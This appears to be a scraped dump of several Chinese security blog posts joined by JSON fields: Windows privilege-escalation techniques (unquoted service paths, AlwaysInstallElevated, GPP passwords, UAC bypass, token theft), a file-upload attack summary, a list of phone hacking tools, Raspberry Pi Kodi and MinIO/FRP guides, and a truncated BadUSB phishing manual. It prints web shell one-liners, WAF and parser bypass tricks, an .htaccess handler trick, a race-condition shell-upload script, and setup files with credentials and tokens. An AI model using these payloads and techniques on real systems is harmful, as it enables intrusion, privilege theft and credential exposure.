服务未运行：攻击者使用任意服务替换原来的服务，并重启服务服务运行中且无法被终止：大多数环境如此，攻击者会利用 DLL 劫持技术并尝试重启服务来提权 多种利用方式 Power Empire 与 Powersploit 的 Powerup 脚本 此脚本会列出服务权限配置错误的漏洞，且下面的 AbuseFunction 里会有需要执行的命令 [[Metasploit#exploit windows local service_permissions]] 注册表键 AlwaysInstallElevated概述 这个策略设置项一旦开启，Windows 将允许任何权限用户以 NT AUTHORITY\\SYSTEM 的身份来安装恶意 MSI MSI 即 Microsoft Windows Installer，双击 MSI 程序就会自动调用 Windows 自带的 Msiexec.exe（这个里边包含了大量安装和卸载软件时需要使用的指令与数据） 这个策略通过 gpedit.msc 中的如下操作打开：组策略-&gt;计算机配置-&gt;管理模板-&gt;Windows 组件-&gt;Windows Installer-&gt;永远以高特权安装：选择启用组策略-&gt;用户配置-&gt;管理模板-&gt;Windows 组件-&gt;Windows Installer-&gt;永远以高特权安装：选择启用 然后注册表会在如下两个位置上自动创建值：1HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevatedHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated 多种利用方式 利用 Powerup 的 Get-RegistryAlwaysInstallElevated 模块来检测此注册表键是否被设置 然后利用 Powerup 的 Write-UserAddMSI 模块，生成一个 Useradd.msi 的 MSI 文件，然后只要以低权限执行这个文件，就会微系统添加一个管理员账户 可信任服务路径漏洞概述 文件或者文件夹都有权限，当用户自身的权限高于它就可以访问，低于就不行。比方说用户自身的权限很低，而假设 C: \\Program Files\\Some Folder\\test_service.exe 这个可执行服务程序的权限很高，且满足了调用服务路径未被引号包裹（可以通过 wmic 查明）并有空格在其中，Windows 会以本属于 test_service.exe 的高权限去依次查询有没有 C: \\Program.exe C: \\Program Files\\Some.exe 是否存在，存在就直接用高权限执行了。（相当于 Windows 是以空格做一个截断） 所以我们只要构造一个存在此漏洞的服务的恶意路径文件名比方说上面的 C: \\Program Files\\Some.exe 实际上是我们上传的恶意文件，重启那个正常服务就会以高权限执行我们的恶意文件了 利用方式一： 使用 wmic 来先列出没有被引号引起来且有空格的服务路径 1wmic service get name,displayname,pathname,startmode |findstr /i &quot;AUTO&quot; |findstr /i /v &quot;C:\\Windows\\\\&quot; |findstr /i /v &quot;&quot;&quot; 接下来利用 icacls 检测是否对那个有空格的目录有写权限 1icacls &quot;C:\\Program Files\\Some folder&quot; 如果有 Everyone 则说明用户对这个文件夹有完全控制权限，括号后面的字符解释如下表格 字符 含义 (M) 修改 (F) 完全控制 (CI) 从属容器将继承访问控制项 (OI) 从属文件将继承访问控制项 然后将重命名过后的恶意文件放到存在问题的目录下，并使用 sc 重启服务就好了 12sc stop service_namesc start service_name 利用方式二： [[Metasploit#exploit windows local unquoted_service_path]] 计划任务 Windows 运行时会有一些计划任务，如果攻击者对那些以高权限运行的任务的目录文件有写权限，那么用恶意文件将其替换，系统便会以高权限运行那个恶意文件 使用如下命令来查看计划任务： 1schtasks /query /fo LIST /v` 利用方式 AccessChk 这个软件是 Windows 自己发布的，常用于管理与排除故障操作，所以一般不会引起杀软的报警 12345678910111213//第一次运行SysInternals工具包的软件会弹出一个协议许可对话框可以使用这个命令来自动接受许可协议accesschk.exe /accepteula //查看某文件夹权限配置情况accesschk.exe -dqv &quot;C:\\Users&quot; -accepteula //列出某个驱动器下所有权限配置有缺陷的文件夹accesschk.exe -uwdqsUsersc:\\accesschk.exe -uwdqs&quot;AuthenticatedUsers&quot;c:\\//列出某个驱动器下所有权限配置有缺陷的文件accesschk.exe -uwqsUsersc:\\*.*accesschk.exe -uwqs&quot;AuthenticatedUsers&quot;c:\\*.* 组策略首选项问题创建一个组策略并批量修改本地管理员密码 创建[[域]]环境后，一般情况下域内机器都是要用自己的密码登录，而为了提升本地管理员密码的安全性，往往会批量修改这个密码 步骤是：创建组策略-&gt;更新组策略中的首选项密码-&gt;将 Domain Computers 组添加到验证组策略对象列表中-&gt;将新建的组策略应用到域中所有的非域控机器上 虽然调高了安全性，但是域中所有机器的本地管理员密码都是相同的了 获取组策略凭据概述 往往在管理员新建了组策略之后，操作系统会在 SYSVOL 共享目录中生成一个[[XML]]文件来保存修改过后的密码，这个密码使用 AES-256 加密算法，安全性还是可以的，但是 2012 年微软官方公布了该密码的私钥，遂安全性降低 目标是找到包含 cpassword 的 XML 文件 多种利用方式 手动查找 cpassword 1234//使用type命令直接搜索访问XML文件type \\\\dc\\sysvol\\pentest.com\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml//然后使用gpprefdecrypt.py来进行解密即可 PowerSploit 提供的 Get-GPPPassword 脚本 [[Metasploit#post windows gather credentials gpp]] 绕过 UAC 提权概述 UAC，即 User Account Control，在权限不够的情况下访问 C: \\、Windows、Program Files 类似目录都需要进行 UAC 认证才能进行。 UAC 规定了高、中、低三个安全控制策略，高等级进程有管理员权限，中等级进程有普通用户权限，低等级进程权限是最有限的 UAC 有如下四种设置要求： 始终通知：最严格的设置，每当程序需要使用高级别权限都会提示本地用户 仅在程序试图更改我的计算机程序时通知我 ：UAC 的默认设置，本地 Windows 程序使用高权限时不通知，第三方使用时通知 仅在程序试图更改我的计算机程序时通知我（不降低桌面亮度）：与默认相似，但不降低桌面亮度 从不提示：当用户是系统管理员时，所有程序都会以最高权限运行 需要 UAC 授权才能进行的操作 配置 Windows Update 增加/删除账户 更改账户类型 更改 UAC 设置 安装 ActiveX 安装/卸载程序 安装设备驱动程序 将文件移动/复制到 Program Files 或者 Windows 目录下 查看其他用户的文件夹 利用方式bypassuac 模块假设已经拿到了目标的一个 meterpreter 的 shell，但是权限是普通用户，我们需要将其提权为管理员用户直接使用[[Metasploit#exploit windows local bypassuac]]模块即可（别忘了填入之前 meterpreter 的 session） ![[Metasploit#exploit windows local bypassuac]] Runas 模块![[Metasploit#exploit windows local ask]] Nishang 的 Invoke-PsUACme 模块12345678910//使用Sysprep方法执行默认的PayloadInvoke-PsUACme -Verbose //使用oobe方法并默认执行payloadInvoke-PsUACme -method oobe -Verbose //使用-Payload参数，可以自定要执行的payloadInvoke-PsUACme -method oobe -Payload &quot;powershell -windowstyle hidden -e YourEncodedPayload&quot; 还可以使用-PayloadPath来指定Payload路径，使用-CustomDll64或者-CustomDll32来自定义DLL文件 Empire 中的 bypassuac 模块 bypassuac 模块 12345usemodule privesc/bypassuac //使用模块set Listener resek4 //设置监听参数execute //执行 bypassuac_wscript 模块 只适用于 Windows7，尚未有补丁，但是杀软会提示 12345usemodule privesc/bypassuac_wscript //使用模块set Listener resek4 //设置监听参数execute //执行 令牌窃取概述 令牌（Token）是系统的临时秘钥，相当于账户与密码，只要不重启系统，获得了令牌就可以在不提供密码或其他凭证的情况下访问网络与系统资源，一般来说令牌随机性与不可预测性很高，攻击者很难猜出来 令牌分为： 访问令牌（Access Token）代表访问控制操作主体的访问对象 密保令牌（Security Token）又叫做“认证令牌”或“硬件令牌”，例如：U 盾 会话令牌（Session Token）是交互会话的唯一身份标识符 伪造令牌的核心为 Kerberos 协议，在第 4 步服务器发送给客户端令牌后，攻击者入侵服务器来窃取那个令牌 利用方式令牌窃取假设已经获取了目标机器的 metepreter 的 shell，依次在 metepreter 中执行以下命令 12345678use incognito list_token -u //列出可用令牌//列出的令牌分两种，一种是Delegation Tokens授权令牌，支持交互式登录（例如远程桌面）//另一种是Impersonation Tokens模拟令牌，支持非交互式的对话//令牌的数量取决于shell的访问级别，令牌的格式为：机器名\\用户名impersonate_token WIN-57TJ21312UGE\\\\Administrator //用伪造的令牌进行访问shell //用伪造的身份开启shell，这个时候返回的隧道就是管理员的了，可以用whoami查看 Rotten Potato 提权和上一步一样，执行到 list_token -u 列出令牌的步骤，然后下载 Rotten Potato该软件目录里有个 rottenpotato.exe，执行如下命令 1234upload /root/RottenPotato/rottenpotato.exe //上传到目标机器execute -HC -f rottenpotato.exeimpersonate_token &quot;NT AUTHORITY\\\\SYSTEM&quot; //这时候再使用getuid已经可以看见权限提升了 Empire 下的 mimikatz 运行 mimikatz，输入 creds 可以查看 Empire 列举出来的密码 使用 pth 比方说：pth 7 来选择自己要窃取的令牌 同时可以使用 ps 命令查看当前是否有域用户的进程正在运行 获取令牌后，可以使用 revtoself 命令来恢复令牌权限 无凭证条件下的权限获取概述[[LLMNR]]![[LLMNR]] NetBIOSNet-NTLM Hash利用方式 Responder","link":"/2021/02/19/%E6%8F%90%E6%9D%83/"},{"title":"File upload vulnerability Summary","text":"文件上传实现HTML 代码如下： 12345678910111213&lt;!--首先HTML会如下写，然后服务器端有一个server.php，用来接收处理上传的文件--&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;upload picture more once&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;1.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--这里action写那个处理的1.php，method写post--&gt;&lt;p&gt;Pictures:&lt;br /&gt;&lt;input type=&quot;file&quot; name=&quot;2333&quot; /&gt;&lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;Send&quot; /&gt;&lt;/p&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 假设我们提交了一个写着 phpinfo() 的 php 文件，然后这个 HTML 会将上传的文件以如下发包方式发过去 1234567891011------WebKitFormBoundary5cOINdf9NfnWclrCContent-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php&quot; Content-Type: application/octet-stream #这里的Content-Type决定了未来传到1.php中的$_FILES['upload_file']['type']里的type值&lt;?php phpinfo();?&gt;------WebKitFormBoundary5cOINdf9NfnWclrCContent-Disposition: form-data; name=&quot;submit&quot;涓婁紶------WebKitFormBoundary5cOINdf9NfnWclrC-- 然后传到 server.php 中时 12345678910111213141516171819202122$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;); $file_name = trim($_FILES['upload_file']['name']);//这里的$_FILES就是上传进来的文件（$_FILES本身是数组形式），前一个[]指定文件是谁，后一个[]指定数组内容 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) {//文件上传成功后会被放到一个临时目录（即$FILES[]['tmp_name']），我们需要将其移动到我们真正上传的目录，不然在此php文件运行结束后上传的文件将被自动删除 $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 具体 $_FILES 用法详见[[PHP全局变量#$_FILES]]，而 $_FILES[][] 后一个中括号里的数组内容可以是： 123456789$_FILES['myFile']['name'] 客户端文件的原名称。 $_FILES['myFile']['type'] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot; $_FILES['myFile']['size'] 已上传文件的大小，单位为字节 $_FILES['myFile']['tmp_name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的$_FILES['myFile']['error'] 和该文件上传相关的错误代码。['error'] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) 文件上传技巧参考[[从PHP代码层面分析文件上传漏洞]] 0x00.Tips 一句话 123456789* asp一句话木马： &lt;%execute(request(&quot;value&quot;))%&gt; * php一句话木马： &lt;?php @eval($_POST[haha]);?&gt; * aspx一句话木马： &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;value&quot;])%&gt; 文件上传有可能是通过 js 控制的，要不禁用 js，要不删除 js 的相关限制函数 传入的一句话可以在浏览器内直接 post php 函数名，比如： 123phpinfo();system('ipconfig')或者在前面加上echo('&lt;pre&gt;');来使输出的文件变得规整 本地验证可以根据上传后的验证速度初步判断是不是本地验证，有可能会有： 1onsubmit=&quot;return checkFile()&quot;//删掉就好 也有可能是 js 限制，不过如果还是前端的话，改一下就好 文件类型验证 如果说服务器检查的是文件的类型 MIME，那么可以更改相应的类型来达到伪造上传的效果，例如： 1234php上传后默认是：text/plain我们可以更改为image/jpeg（这个具体是什么视情况而定） 偶尔可以尝试将.php 先改为.jpg，再在 burp 的抓包里改回来 文件后缀名验证可以更改文件的后缀名来绕过黑名单，例如：php 别名 123456.php2.php3.php4.phps.pht.phtml 对图片内容给进行验证就是图片马如果没对图片后缀进行验证，那么改后缀为 php 即可。但是如果对后缀进行了验证，我们就必须上传图片后缀文件，同时里边加上 shell 代码。 空字节截断如果抓包中有显示文件上传的相对路径名字，那么可以尝试在路径后面做出改变，例如： 1231.php+空格+1.jpg及：1.php 1.jpg然后在HEX十六进制的页面，将自己的空格（20）改为00，再回去看那个地方空格会变成一个小白方格 上传的时候就会自动忽略.jpg 服务端检测文件内容如果只校验 php/asp 等后缀名内容是不是木马我们可以通过先去上传一个含有木马的 txt 文件然后再上传一个有[[文件包含漏洞]]操作的无害 php 文件， 12345678#PHP &lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt; #ASP &lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt;#JSP &lt;jsp:inclde page=&quot;上传的txt文件路径&quot;/&gt;or &lt;%@include file=&quot;上传的txt文件路径&quot;%&gt; 服务端检测文件头123PNG： 文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0AJPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)GIF： 文件头标识 (6 bytes) 47 49 46 38 39(37) 61 在木马前加上文件相关文件头就好了例如 12GIF89a&lt;?php phpinfo(); ?&gt; 条件竞争上传上传的脚本绕过了过滤，但是在那边会被查杀删除，所以我们可以原理：写一个脚本，使用一个多并发线程发送 shell，同时时刻访问那个 shell，总有一个会连接上脚本示例： 12345678910111213141516171819202122232425262728293031323334353637383940import osimport requestsimport threadingclass RaceCondition(threading.Thread): def __init__(self): threading.Thread.__init__(self) self.url = &quot;http://127.0.0.1:8080/upload/shell0.php&quot; self.uploadUrl = &quot;http://127.0.0.1:8080/upload/copy.php&quot; def _get(self): print('try to call uploaded file...') r = requests.get(self.url) if r.status_code == 200: print(&quot;[*]create file info.php success&quot;) os._exit(0) def _upload(self): print(&quot;upload file.....&quot;) file = {&quot;file&quot;:open(&quot;shell0.php&quot;,&quot;r&quot;)} requests.post(self.uploadUrl, files=file) def run(self): while True: for i in range(5): self._get() for i in range(10): self._upload() self._get()if __name__ == &quot;__main__&quot;: threads = 20 for i in range(threads): t = RaceCondition() t.start() for i in range(threads): t.join() WAF 骚操作绕过 删除 Content-Disposition 与 form-data 中间默认有的空格 更改 Content-Disposition 字符中的大小写 特殊的长文件名绕过 1shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg 有些 WAF 的规则是：如果数据包为 POST 类型，则校验数据包内容。 此种情况可以上传一个 POST 型的数据包，抓包将 POST 改为 GET。 利用 WAF 本身的缺陷： 直接删除 Content-Type 整行删除掉 ontent-Type: image/jpeg 只留下 c，将.php 加 c 后面即可，但是要注意额，双引号要跟着 c.php 123正常包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png构造包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.pngC.php&quot; 在文件内容填垃圾数据，绕过内容检验 在文件头填垃圾数据，绕过文件名检验 Content-Disposition 参数后面去加垃圾数据，导致 waf 出错 Content-Disposition 在请求头中时 通常存在于 multipart/form-data 请求体中 1Content-Disposition: form-data; name=&quot;fieldName&quot;; filename=&quot;filename.jpg&quot; //第一个参数恒定为form-data ，后两个分别是表单项名与上传的文件名 在响应头时，表示页面以什么形式呈现 是参数inline 时，以页面或页面的一部分渲染呈现是参数attachment时，将页面作为文件下载 123456// 正常解析渲染Content-Disposition: inline// 下载文件Content-Disposition: attachment// 下载文件，并将文件保存为filename.jpgContent-Disposition: attachment; filename=&quot;filename.jpg&quot; 0x01.Apache当文件上传过去的时候，Apache 从右向左对文件名进行解析 利用 Apache 从右向左的解析习惯 上传 1.php.bak 或者任意一个编造的后缀在某些版本可当做 php 来执行（因为 apache 从右到左对文件名进行解析，而 .bak 是 httpd.conf 识别不了的文件名后缀，故 apache 会自动提取左边的.php） 通过构造当前网页配置文件.htaccess 创建一个文件名为.htaccess 的文件，保存格式为 eXtensible Markup Language file内容为： 123456&lt;FilesMatch &quot;cimer&quot;&gt; //cimer可以替换为自己想要的后缀名，后期改这个后缀名上传就好了SetHandler application/x-httpd-php&lt;/FilesMatch&gt;将.htaccess上传到指定页面中（它是配置文件，所以不会被拦截），然后将自己的.php代码更改后缀名为.cimer（自己起的那个）上传 菜刀连接时同样访问这个****.cimer就好。 0x02.nginx 上传了个 1.jpg（这里不是图片马） 只要访问 www.hahaha.com/upload/1.jpg/1.php 便可以执行 php 代码 一般文件上传是不需要图片马的，正常上传改后缀，解析啥的即可。 12345只有当有函数getimagesize()作过滤的时候（会检查文件头，图片的长宽等），才需要使用图片马。图片马可以通过cmd中copy来制作 ，假设图片是1.jpg,马是2.php，最后生成3.jpgcopy 1.jpg/a+2.php/b 3.jpg 最后需要将文件名改为 3.jpg.php，才可以连接菜刀。 0x03.IIS6.0IIS6.0 的解析漏洞 随便上传一张图片，更改包内上传文件保存的地址，增加一个 1.asp/，比方说 12345包内显示原上传路径为:upload/这时需要更改为：upload/1.asp/ 或者1.php这样那个图片文件就会默认保存在1.asp/后边的目录了，记录下上传后的文件名 然后菜刀地址里就写：...../upload/1.asp/haha.jpg，输入密码即可连接 这时候 IIS 就会自动忽略不解析/haha.jpg 这段内容，直到 1.asp 就停止了 随便上传一张图片，仍然是更改包中的路径，但这次利用分号 123456包内显示原上传路径为:upload/这时需要更改为：upload/1.asp； //注意：文件名那里不能动，因为即便文件名改为1.asp;1.jpg，上传后构造的1.asp;全部会被替换掉 上传完后，上传的图片（其实没有）和1.asp都是同在upload文件夹下面的 所以菜刀的连接地址为：upload/1.asp;1.jpg 系统会认为分号是一个内存断点","link":"/2020/08/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"title":"一个黑客能用一台手机做到什么事情","text":"《看门狗2》里黑客Marcus见到自己偶像T-bone讲到： 我看着你曾经”战争驾驶“，并因此改装了我的十段变速脚踏车，然后在背包上加装天线 战争驾驶（WarDriving）就是指使用相应的硬件和软件打造的无线局域网侦察平台，通过徒步或利用相应交通工具的方式在各个城镇的每个街道寻找不设防的无线访问点(AP)的一种统称。 而它的存在，便是黑客对”便携性“这个需求的最大证明 这么些年也折腾过不少安全相关APP，在这里大致汇总了下，并从软件、工具角度出发，带你了解黑客能用一部手机做些什么。 下面是正文：先讲讲和黑客直接相关的 0x00.针对不乐意折腾的人终端与连接类 JuiceSSH ConnectBot 终端模拟器 Termux VNC Viewer 编程类 Qpython 3/OL（python安卓端编程app，挺多版本，看需求） C4droid （安卓端编写C语言的app） AIDE Web （编写web相关语言） 各种厂商路由器、服务器app TP-LINK 天翼网关、天翼云电脑（放在这里说，因为前段时间在天翼云白嫖服务器实在太香了） … 其余类 ES文件浏览器 （没root的首选，现在广告有点烦人，不过也吊打那些手机自带的） IP Tools （一款个人比较喜欢的查局域网ip信息相关工具） Tasker （一款让你手机自动化起来的软件，用得好是神器，不过得花精力学习用法） Packet Capture （经典手机抓包软件，不会在电脑上搞burp代理的话还是蛮方便的） Github/Openhub/Coding （各种代码托管网站的手机版app） 0x01.针对乐意折腾的人说实话，“黑客精神”怎会嫌麻烦，不折腾的话很多吊炸天的功能你是开发不出来的这里的折腾特指：搞Root、刷机、adb操作，熬夜（滑稽）… 一般软件类 Shadowsocks/Shadowsocks R、各种VPN （科学上网，不多比比） cSploit/dSploit （贼牛逼的一个局域网攻击神器） zANTI （同上，但是听说动静较大，所以我基本还是用上面那个） MT管理器、Root Explorer （个人用RE较多，文件管理神器，吊打ES） Shodan （强大的联网设备搜索引擎，其功能参照：Zoomeye、Fofa等） Hacker’s Keyboard （如果不外接键盘，这个键盘软件绝对是我的心水，因为它优化了界面，更容易输入那些搞安全需要用到的字符） RF Analyzer （Nethuner自带，无线射频分析相关，我没怎么用过，毕竟360的Hackcube啥的都有自家的软件。。。） Nethunter VNC （Nethunter自带，不过我的版本老报错，所以自己还是使用 VNC Viewer较多） Tor （首先需要科学上网，然后你便可以通过这个全球代理软件隐蔽的进入暗网了） 其他某些软件自我感觉蛮花里胡哨，实际渗透中其实比较局限，我平常不太用，这里放下 （重头戏）框架类 首先祭上最牛逼的Kali Nethunter ！！！关于如何刷Kali Nethunter在这里放两个教程： 【教程】怎么成为一名“黑手党” 聊聊黑客手机 3.0 （余弦大大的文章） 做黑客不知道kali怎么行，有句老话：kali学得好，牢饭吃得早（大雾） 首先，你可以在终端使用绝大部分kali软件，如下： Metasploit （经典漏洞利用框架，是你从手机向世界发起攻击的不二选择（笑）） Nmap （老牌扫描器，现在仍是一把好手） Sqlmap （数据库注入神器） ettercap （局域网ARP欺骗工具） wifite （经典无线攻击工具，爆破wifi密码等） kali上工具太多了，用过的自然知道手机版的kali有多imba，唯一的硬伤就是“手机的处理速度”，不过瑕不掩瑜 Nethuner （Kali Nethunter自家系统集成的软件，功能丰富） MAC Changer（更改对外显示的设备MAC地址） DuckHunter HID （将自己的手机模拟为一个badusb，通过数据线插入设备即可造成危害） Pineapple Connector （Wifi Pineapple连接器，相当于简化了从浏览器直连，如果买的是某宝的国产大菠萝刚好能用上，如果买的是官方菠萝派，建议使用google play上人家自家的软件） DeAuth （流量洪水攻击） AndRax （也是一个集成了各种渗透工具的框架，当初Freebuff一推送我就直接去官网下载了初版，不过个人用的不多） Xposed框架 （这个必须要提，很多玩机的发烧友很喜欢在这个上面做文章，酷安上有一大堆模块），比方说我们可以： qq/微信秒抢红包 手机状态栏等各种奇妙美化 更牛逼的杀后台应用 这是一个玩机的深坑……. 我是萌萌哒的分割线 0x02.外挂相关虽说不只是单单一部手机了，但是在这里介绍一些以手机作为主体而向外扩展的外挂 分线器、转接线 （必备，自供电那种最好，手机的一个插线口过于限制我们黑客的想象力（笑）） TP-LINK TL-WN722N （适配kali的无线网卡，如果你要使用wifite，这个必备） Wifi Pineapple （wifi大菠萝，一个词描述就是“牛逼”，想要图形页面直接在手机浏览器输入ip就可访问，如果钟爱命令行，不妨尝试：“JuiceSSH+大菠萝”） 无线键盘 （手机上的屏幕键盘始终还是不方便，预算充足就买蓝牙的（罗技那款，100+），不足就在某宝买飞鼠键盘（30-40rmb）） 其他工具，与手机联合打组合拳（要不是在手机上ssh，有线连接，要不就是官方有手机版app） 树莓派 （不多说了，用手机ssh连上能做的事情太多） Proxmark3/4 （基于RFID的嗅探、克隆等操作，可用于破解ID/UID等卡片） PocketChip （一个我自己比较喜欢的Linux小玩具） Hackcube （360无线电研究院搞的便携式硬件平台） Badusb/USB Ninja （或者圈内小火龙大佬自己搞得hackusb） 我是萌萌哒的分割线 0x03.黑客情怀相关“黑客也是寻常人”（笑），以下罗列一些其他搞安全必知必备的软件 通过手机获取安全资讯 Telegram （即“电报”，除了些奇奇怪怪的channel（逃），有些资源，大佬的博客在这个上面都可以找到，比方说：余弦大佬的“灰袍推送”） Twitter （搞安全，缺不了与国际接轨，很多0day或是国外大牛的好文章都会在这上分享，只是比较考验英语水平） Feedly （如果你受不了短平快的碎片化信息，在Feedly上订阅一些大佬的博客不失为一个好习惯（虽然现在有些功能需要花钱让我很不爽）） Ins （如果你喜爱黑客文化，在这个上面你绝对能找到很多非常有创意的黑客文化元素） 通过手机看安全视频 Youtube （开玩笑呢，Blackhat、Defcon、Hak5各种频道都聚集在此，怎么能少得了这款软件） bilibili （作为新世纪的优秀青年，你应该敏锐的发觉：国内很多安全团队的内部培训视频非常喜欢上传b站，以及b站的直播） i春秋 （虽然手机版体验也就那样，不过仍是一个不错的安全学习平台） 最后，放上我的情怀黑莓镇楼：","link":"/2020/05/27/%E9%BB%91%E5%AE%A2%E6%89%8B%E6%9C%BA/"},{"title":"使用 Raspberry Pi 搭建 Kodi 家庭影院","text":"下载kodi1sudo apt install kodi 配置kodi自启动 配置服务1sudo vim /lib/systemd/system/kodi.service 并输入以下内容 12345678910111213[Unit]Description = Kodi Media CenterAfter = remote-fs.target network-online.targetWants = network-online.target[Service]Type = simpleExecStart = /usr/bin/kodi-standaloneRestart = on-abortRestartSec = 5[Install]WantedBy = multi-user.target 刷新sytemctl，并启用相关服务 12345sudo systemctl-reloadsudo systemctl start kodisudo systemctl enable kodi# 可以查看服务器启动情况sudo systemctl status kodi 使用以下命令，达到打开电视自动启动kodi 1kodi &gt;/dev/null 2&gt;&amp;1 &amp; 配置HDMI强制热插拔如果不配置这个选项，那么只有当树莓派启动的时候才会检测hdmi信息，达不到开电视即可看的效果修改 1sudo vim /boot/config.txt 将其中如下行的注释符去掉 1hdmi_force_hotplug=1 使用kodi使用内网文件共享 Mac上 系统偏好设置-用户和组-添加一个新的用户（用户名/密码） 系统偏好设置-通用-共享-打开文件共享并且打开右边的信息，配置具体共享的文件夹，及共享人 Windows上 WIndows可选功能中，添加“SMB 1.0”的功能 对想要共享的文件夹，设置高级共享即可 配置好共享后，可以在kodi中添加视频 配置插件IPTV12# 下载kodi-pvr-iptvsimplesudo apt install kodi-pvr-iptvsimple 刮削器kodi自带的本身刮削器就很好用，不管是电影还是剧集均取自于在线网站：The Movie Database (TMDB) 在kodi配置好代理的情况下，添加文件便可自动使用刮削器对电影的信息进行在线采集，但是电影的文件名需规范化 不管是电影（Movies）还是剧集（TV Episode），文件名均需要去TMDB上看已有的电影名是怎么规范化书写的，同时注意加上年份。例如本剧，则需要写成“***浴血黑帮(2013)***” 如果是剧集，那么文件结构最好是规范化的剧集名-季分类信息-每一集的信息季分类信息最好是“Season 1, Season 2”分集信息最好包含***规范化的S(Season)及E(Episode)***“xxxx.S01E02.xxx-xxx.mp4” 如果文件名是中文，kodi的插件脚本会自动获取TMDB上该电影/剧集的中文信息，如果想获取英文信息，同理需要把文件名按规范改为英文名 如果发现某些季/集在TMDB上没有，那么可以在TMDB上注册一个账号，自己来添加 如果是在不同网段下开启路由器的AP模式（有线中继）这时候chen-2.4就和chen4在同一个网段下了，同时wifi还互不干扰分别设置树莓派和电脑的静态IP如果ping不通，很有可能是windows防火墙没有设置好可以在windows防火墙中，设置 SMB 文件共享 V2ray V2rayN xray的通过策略 以ping通为准如果windows的ip变化了，记得更改电影/剧集的视频源+代理信息","link":"/2022/12/09/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%90%AD%E5%BB%BA%E5%AE%B6%E5%BA%AD%E5%BD%B1%E9%99%A2/"},{"title":"使用 Raspberry Pi 自建 MinIO 图床","text":"在服务器/树莓派搭建MinIO我使用的图床为MinIO，可以使用docker一键搭建其中账号和密码均在其中 1234567891011docker run \\ -p 9000:9000 \\ -p 9001:9001 \\ --name minio1 \\ -v /data/minio/data:/data \\ -v /data/minio/config:/root/.minio \\ -e &quot;MINIO_ROOT_USER=IHCVodsfa23jsksssv12&quot; \\ -e &quot;MINIO_ROOT_PASSWORD=IUH2ioh23xxIid33&quot; \\ -e MINIO_SERVER_URL=http://localhost:9000 \\ quay.io/minio/minio server /data \\ --address &quot;:9000&quot; --console-address &quot;:9001&quot; \\ 设置启动docker便自启动容器 1docker update --restart=always minio1 使用树莓派进行FRP内网穿透在服务器端搭建frps按照服务器架构在github上下载frp包，服务器端我们只会用到frps和frps.ini 配置frps.ini 123[common]bind_port = 7000token = xii21n12noci 这里的common端口即为frp的通信端口，需与客户端保持一致token可为通信进行加密，需与客户端保持一致 在客户端搭建frpc同理按照客户端架构在github上下载frp包，客户端我们只会用到frpc和frpc.ini 配置frpc.ini 1234567891011[common]server_addr = 120.48.17.251server_port = 7000token = xii21n12noci[picgo]type = tcplocal_ip = 127.0.0.1local_port = 9000remote_port = 9000#访问远程的9000即访问本地的9000 common中的 server_addr 需为frps服务器的地址端口和token需与服务器保持一致 下方为连接服务， local_ip 和 local_port 代表着本地ip及端口，remote_ip 代表着服务器的端口，意思即为：当访问服务器的9000端口时，将TCP流量转发至127.0.0.1:9000（本地的9000端口） 置frpc/frps服务器开机自启新建systemctl文件，系统自启进程名自行更改 1sudo vim /lib/systemd/system/frpc.service 写入 12345678910111213[Unit]Description=frpcAfter=multi-user.target[Service]TimeoutStartSec=10RestartSec=30sRestart=alwaysExecStart=/usr/bin/frpc -c /etc/frpc.iniExecStop=/bin/kill $MAINPID[Install]WantedBy=multi-user.target 然后启动相关服务即可 12345678# 更新服务文件sudo systemctl daemon-reload# 开启sudo systemctl start frpc# 设置开机启动sudo systemctl enable frpc# 查看状态sudo systemctl status frpc","link":"/2022/12/07/%E6%A0%91%E8%8E%93%E6%B4%BE%E8%87%AA%E5%BB%BA%E5%9B%BE%E5%BA%8A/"},{"title":"Four Fishing Scenes Demo Manual","text":"# BadUSB Fishing CS releasedBadUSB Fishing CS releasedUse the tool Digispark , shaped like a USB memory stick, and use the Arduino compilation to burn programs into it. Install Arduino debugging software Open the Arduino website Arduino - Home and click Software. Download the Windows version of the software (the one that says Win7 or newer on the right) to install Install the software, which will prompt you to install a USB drive, click Install The installation is successful as shown in the following figure Configuring Digispark in the Arduino board In Additional Board Manager URLs, add:1https://raw.githubusercontent.com/ArminJo/DigistumpArduino/master/package_digistump_index.json Click Development Edition Management, and search for digistump , you can find this development version configuration information, install this Digistump AVR Boards Click Development Boards - &gt; Digistump AVR Boards - &gt; Digispark (Default - 